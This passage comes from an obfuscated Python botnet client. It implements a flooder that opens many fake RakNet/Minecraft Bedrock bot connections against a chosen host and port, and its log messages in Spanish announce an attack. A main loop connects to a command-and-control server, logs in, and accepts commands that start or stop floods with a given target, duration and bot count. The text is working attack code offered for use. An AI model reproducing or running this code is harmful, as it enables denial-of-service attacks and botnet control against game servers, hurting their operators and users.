	if D==16:BV(C,A);return
	if D==254:
		if G(A)<2:return
		if A[1]==6:AF(C,A[2:])
		else:A2(C,A[1:])
		return
	if D==146:AF(C,A[1:]);return
	if D==6 and C[V]>=84:AF(C,A[1:]);return
	A2(C,A)
def BU(bot,msg):
	B=bot
	if B[H]:return
	A=b(msg);A.skip(1);K=A.t_le();B[y].append(K)
	while A.left()>0:
		try:
			D=A.u8();E=D>>5&7;F=D>>4&1;M=A.u16be();N=math.ceil(M/8)
			if E in(2,3,4,6,7):A.t_le()
			if E in(1,3,4):A.t_le();A.u8()
			G=C=I=0
			if F:G=A.u32be();C=A.u16be();I=A.u32be()
			J=A.bytes_(N)
			if F:
				if C not in B[e]:B[e][C]=[L]*G
				B[e][C][I]=J
				if all(A is not L for A in B[e][C]):Ai(B,p.join(B[e][C]));del B[e][C]
			else:Ai(B,J)
		except:break
def BV(bot,payload):
	A=bot
	if A[H]:return
	C=b(payload);C.skip(1);G=0
	try:
		K=C.u8();C.skip(6 if K==4 else 18);C.skip(2)
		for L in E(10):O=C.u8();C.skip(6 if O==4 else 18)
		G=C.i64be()
	except:pass
	D=M().u8(19).rak_ip(A[r],A[s])
	for L in E(10):D.u8(4).u8(128).u8(255).u8(255).u8(254).u16be(0)
	D.i64be(G).i64be(I(B.time()*1000));n(A,D.buf(),N,0,0,0)
	if A[P]==Ao:
		A[P]='LOGIN'
		def Q():
			if J or A[H]:return
			Ae(A,BM(A)if A[V]>=84 else BN(A))
		F.Timer(.1,Q).start()
def AG(bot):
	A=bot
	if A[R]is L or A[H]or J:return
	B=A0[A[AB]%G(A0)];A[t]=B;C=max(0,B-28-1-16-1);Y(A,M().u8(5).magic().u8(7).raw(S(C)).buf())
def AH(bot):
	A=bot
	if A[H]:return
	A[H]=D;A[d]=N
	for B in(AA,W,f):
		C=A.get(B)
		if C:C.cancel();A[B]=L
	E=A[R];A[R]=L
	if E:
		try:E.close()
		except:pass
def AI(bot):
	A=bot
	if A[W]:A[W].cancel()
	def C():
		if A[P]!=AC or A[H]or J:return
		A[AB]=(A[AB]+1)%G(A0);AG(A);AI(A)
	B=F.Timer(3.,C);B.daemon=D;B.start();A[W]=B
def BW(host,port,nombre,register_cmd,mensajes,intervalo):
	h='UNCONNECTED';C={r:host,s:port,A3:BJ(nombre),x:register_cmd,A8:mensajes,An:intervalo,c:I.from_bytes(g.urandom(8),'big'),t:A0[0],AL:0,AM:0,AN:0,AO:0,AP:0,U:{u:0,v:64,w:0,A7:0,'pitch':0},d:N,H:N,R:L,AQ:N,P:h,AB:0,V:70,k:N,A9:N,y:[],e:{},j:{},AA:L,W:L,f:L};a=A.socket(A.AF_INET,A.SOCK_DGRAM);a.setblocking(N);a.bind((Z,0));C[R]=a;Y(C,M().u8(1).i64be(I(B.time()*1000)).magic().u64be(C[c]).buf())
	def Q():
		m='_req2flip';l='CONNECTING_2'
		while not C[H]and not J:
			try:A,u=a.recvfrom(65535)
			except BlockingIOError:B.sleep(.001);continue
			except:break
			if not A:continue
			U=A[0]
			if U==192:continue
			if U==160:
				try:
					Z=b(A);Z.skip(1);v=Z.u16be()
					for u in E(v):
						w=Z.u8();K=Z.t_le();S=K if w else Z.t_le()
						for x in E(K,S+1):
							o=C[j].get(x)
							if o and C[R]and not C[H]:Y(C,o)
				except:pass
				continue
			if 128<=U<=143:
				BU(C,A)
				if C[y]and not C[H]:
					X=sorted(set(C[y]));d=[];Q=0
					while Q<G(X):
						K=S=X[Q]
						while Q+1<G(X)and X[Q+1]==X[Q]+1:Q+=1;S=X[Q]
						d.append((K,S));Q+=1
					e=M().u8(192).u16be(G(d))
					for(K,S)in d:e.u8(1).t_le(K)if K==S else e.u8(0).t_le(K).t_le(S)
					Y(C,e.buf());C[y]=[]
				continue
			if U==6 and C[P]==AC:
				if G(A)>=2:p=O.unpack_from('>H',A,G(A)-2)[0];C[t]=p if 576<=p<=1500 else 1400
				C[P]=l
				if C[W]:C[W].cancel();C[W]=L
				q=M().u8(7).magic().rak_ip(host,port).u16be(C[t]).u64be(C[c]).buf();Y(C,q);C[m]=N
				def r():
					if C[P]!=l or C[H]:return
					C[m]=not C[m];Y(C,q);A=F.Timer(2.,r);A.daemon=D;A.start();C[f]=A
				g=F.Timer(2.,r);g.daemon=D;g.start();C[f]=g;continue
			if U==8 and C[P]==l:
				if C[f]:C[f].cancel();C[f]=L
				C[P]=Ao;n(C,M().u8(9).u64be(C[c]).i64be(I(B.time()*1000)).u8(0).buf(),N,0,0,0);continue
			if U==28 and C[P]==h:
				try:
					i=b(A);i.skip(33);z=i.bytes_(i.u16be()).decode(T,errors=Al);k=z.split(';')
					if G(k)>=3 and k[2].isdigit():
						s=I(k[2])
						if s>0:C[V]=s
				except:pass
				if C[W]:C[W].cancel();C[W]=L
				C[P]=AC;AG(C);AI(C);continue
	F.Thread(target=Q,daemon=D).start();K=[0]
	def S():
		while C[P]==h and not C[H]and not J:
			B.sleep(.5);K[0]+=1
			if K[0]>=4:
				if C[P]==h:C[V]=70;C[P]=AC;AG(C);AI(C)
				return
			Y(C,M().u8(1).i64be(I(B.time()*1000)).magic().u64be(C[c]).buf())
	F.Thread(target=S,daemon=D).start();return C
def BX(host,port,nombre,cantidad,tiempo,register_cmd,mensajes_raw,intervalo):
	L=mensajes_raw;K=nombre;G=intervalo;C=cantidad;A=tiempo;global a,J
	try:
		C=I(C);A=I(A);G=I(G);M=[A.strip().replace('-',' ')for A in L.split('|')if A.strip()]if L else['Hola!'];Q(f"[MCBot] Iniciando ataque a {host}:{port}");Q(f"[MCBot] Bots: {C}, Tiempo: {A}s, Nombre: {K}")
		for P in E(C):
			if J:break
			F=BW(host,port,K,register_cmd,M,G)
			with AD:a.append(F)
			B.sleep(.3)
		if A>0:
			B.sleep(A);J=D
			with AD:
				for F in a[:]:
					F[H]=D
					try:F[R].close()
					except:pass
				a.clear()
			J=N
		return D
	except o as O:Q(f"[MCBot] Error: {O}");return N
def BY():
	global a,J;J=D
	with AD:
		for A in a[:]:
			A[H]=D
			try:A[R].close()
			except:pass
		a.clear()
def BZ():
	P='MCBOT';global J
	while D:
		try:
			E=A.socket(A.AF_INET,A.SOCK_STREAM);E.setsockopt(A.SOL_SOCKET,A.SO_KEEPALIVE,1);E.settimeout(10);Q(f"[*] Conectando a {AU}:{AV}...");E.connect((AU,AV));Q('[+] Conectado!');H=0
			while H<2:
				try:
					K=E.recv(1024).decode()
					if'Username'in K:E.send(BD().encode());H=1
					elif'Password'in K and H==1:E.send('ÿÿÿÿ='.encode('cp1252'));H=2
				except A.timeout:continue
				except:break
			if H<2:raise o('Auth failed')
			Q('✅ Autenticado!')
			while D:
				try:
					K=E.recv(1024).decode().strip()
					if not K:continue
					C=K.split(' ');M=C[0].upper()
					if M=='PING':E.send('PONG'.encode())
					elif M=='STOP'and G(C)>1:
						L=C[1];BG(L)
						if L==P or P in L:BY();J=N
					elif M=='.MCBOT':
						if G(C)>=9:R=C[1];O=I(C[2]);S=C[3];T=I(C[4]);U=I(C[5]);V=C[6];W=C[7];X=I(C[8]);J=N;F.Thread(target=BX,args=(R,O,S,T,U,V,W,X),daemon=D).start()
					elif G(C)>=4:Y=M;Z=C[1];O=I(C[2]);a=I(C[3]);L=C[4]if G(C)>=5 else'default';BF(Y,Z,O,a,0,L)
				except A.timeout:continue
				except:break
			E.close()
		except o as b:Q(f"❌ Error: {b}")
		Q(f"[*] Reintentando en {AW} segundos...");B.sleep(AW)
if __name__=='__main__':
	try:BZ()
	except KeyboardInterrupt:Q('\n🛑 Detenido');sys.exit(0)
	except:pass
